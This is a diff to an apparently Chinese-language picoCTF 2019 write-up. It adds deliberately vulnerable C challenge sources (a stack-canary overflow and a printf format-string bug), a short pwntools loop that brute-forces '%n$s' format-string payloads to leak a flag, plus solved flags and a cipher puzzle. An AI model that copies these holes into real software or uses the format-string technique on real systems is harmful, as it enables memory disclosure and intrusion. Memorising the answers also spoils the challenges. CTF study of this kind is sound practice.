@@ -363,7 +363,84 @@ while 1:
                 break
 
 ```
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <wchar.h>
+#include <locale.h>
 
+#define BUF_SIZE 32
+#define FLAG_LEN 64
+#define KEY_LEN 4
+
+void display_flag() {
+  char buf[FLAG_LEN];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("'flag.txt' missing in the current directory!\n");
+    exit(0);
+  }
+  fgets(buf,FLAG_LEN,f);
+  puts(buf);
+  fflush(stdout);
+}
+
+char key[KEY_LEN];
+void read_canary() {
+  FILE *f = fopen("/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt","r");
+  if (f == NULL) {
+    printf("[ERROR]: Trying to Read Canary\n");
+    exit(0);
+  }
+  fread(key,sizeof(char),KEY_LEN,f);
+  fclose(f);
+}
+
+void vuln(){
+   char canary[KEY_LEN];
+   char buf[BUF_SIZE];
+   char user_len[BUF_SIZE];
+
+   int count;
+   int x = 0;
+   memcpy(canary,key,KEY_LEN);
+   printf("Please enter the length of the entry:\n> ");
+
+   while (x<BUF_SIZE) {
+      read(0,user_len+x,1);
+      if (user_len[x]=='\n') break;
+      x++;
+   }
+   sscanf(user_len,"%d",&count);
+
+   printf("Input> ");
+   read(0,buf,count);
+
+   if (memcmp(canary,key,KEY_LEN)) {
+      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
+      exit(-1);
+   }
+   printf("Ok... Now Where's the Flag?\n");
+   fflush(stdout);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  int i;
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  read_canary();
+  vuln();
+
+  return 0;
+}
+```
 picoCTF{cAnAr135_mU5t_b3_r4nd0m!_bf34cd22}
 
 *他說flag不對*
@@ -438,3 +515,92 @@ int main(void)
 - -w 不生成任何警告
 
 picoCTF{0x23c}
+## stringzz - Points: 300 - (Solves: 616)Binary Exploitation
+### review
+保護全開 當初是卡在沒想到 buf 還在stack 上
+
+我直接gdb find 看到local 端 假的flag 是在heap上 然後我就直接放棄了
+
+就是爆破 stack  
+### code
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define FLAG_BUFFER 128
+#define LINE_BUFFER_SIZE 2000
+
+void printMessage3(char *in)
+{
+  puts("will be printed:\n");
+  printf(in);
+}
+void printMessage2(char *in)
+{
+  puts("your input ");
+  printMessage3(in);
+}
+
+void printMessage1(char *in)
+{
+  puts("Now ");
+  printMessage2(in);
+}
+
+int main (int argc, char **argv)
+{
+    puts("input whatever string you want; then it will be printed back:\n");
+    int read;
+    unsigned int len;
+    char *input = NULL;
+    getline(&input, &len, stdin);
+    //There is no win function, but the flag is wandering in the memory!
+    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
+    FILE *f = fopen("flag.txt","r");
+    fgets(buf,FLAG_BUFFER,f);
+    printMessage1(input);
+    fflush(stdout);
+
+}
+
+```
+```
+from pwn import *
+# context.log_level='DEBUG'
+for i in range(1,100):
+    r=process('./vuln')
+    r.recvuntil(':')
+    payload='%'+str(i)+'$s'
+    r.sendline(payload)
+    recv=r.recvall()
+    if '{' in recv:
+        print recv
+        break
+
+```
+picoCTF{str1nG_CH3353_df5265ef}
+## Flags - Points: 200 - (Solves: 5547)Cryptography
+### review
+居然有一堆人解 我覺的這題很通靈
+
+丟以圖搜尋沒東西
+但是如果查 `flag p` `flag i ` ... 點除片就會發現它是 國際信號旗
+
+
+https://zh.wikipedia.org/wiki/%E5%9C%8B%E9%9A%9B%E4%BF%A1%E8%99%9F%E6%97%97
+
+![](https://github.com/0xdeciverAngel/picoCTF2019/blob/master/flag.png?raw=true)
+
+PICOCTF{F1AG5AND5TUFF}
+## waves over lambda - Points: 300 - (Solves: 2647)Cryptography
+```
+### code
+-------------------------------------------------------------------------------
+bfowyqpx ilyl ux sfhy vnqw - vylthlobs_ux_b_fcly_nqmarq_mhjwjloofr
+-------------------------------------------------------------------------------
+alpzllo hx pilyl zqx, qx u iqcl qnylqrs xqur xfmlzilyl, pil afor fv pil xlq. alxurlx ifnruow fhy ilqypx pfwlpily piyfhwi nfow jlyufrx fv xljqyqpufo, up iqr pil lvvlbp fv mqeuow hx pfnlyqop fv lqbi fpily'x sqyoxqor lclo bfocubpufox. pil nqzslypil alxp fv fnr vlnnfzxiqr, albqhxl fv iux mqos slqyx qor mqos cuyphlx, pil fons bhxiufo fo rlbe, qor zqx nsuow fo pil fons yhw. pil qbbfhopqop iqr ayfhwip fhp qnylqrs q afg fv rfmuoflx, qor zqx pfsuow qybiuplbphyqnns zupi pil afolx. mqynfz xqp byfxx-nlwwlr yuwip qvp, nlqouow qwquoxp pil mukklo-mqxp. il iqr xhoelo billex, q slnnfz bfmjnlgufo, q xpyquwip aqbe, qo qxblpub qxjlbp, qor, zupi iux qymx ryfjjlr, pil jqnmx fv iqorx fhpzqyrx, ylxlmanlr qo urfn. pil ruylbpfy, xqpuxvulr pil qobify iqr wffr ifnr, mqrl iux zqs qvp qor xqp rfzo qmfowxp hx. zl lgbiqowlr q vlz zfyrx nqkuns. qvplyzqyrx pilyl zqx xunlobl fo afqyr pil sqbip. vfy xfml ylqxfo fy fpily zl rur ofp alwuo piqp wqml fv rfmuoflx. zl vlnp mlrupqpucl, qor vup vfy ofpiuow ahp jnqbur xpqyuow. pil rqs zqx loruow uo q xlyloups fv xpunn qor lgthuxupl ayunnuqobl. pil zqply xifol jqbuvubqnns; pil xes, zupifhp q xjlbe, zqx q alouwo ummloxups fv hoxpquolr nuwip; pil clys muxp fo pil lxxlg mqyxi zqx nuel q wqhks qor yqruqop vqayub, ihow vyfm pil zffrlr yuxlx uonqor, qor ryqjuow pil nfz xifylx uo ruqjiqofhx vfnrx. fons pil wnffm pf pil zlxp, ayffruow fcly pil hjjly ylqbilx, albqml mfyl xfmayl lclys muohpl, qx uv qowlylr as pil qjjyfqbi fv pil xho.
+```
+flag又不一樣 我的flag
+
+frequency_is_c_over_lambda_mupgpennod
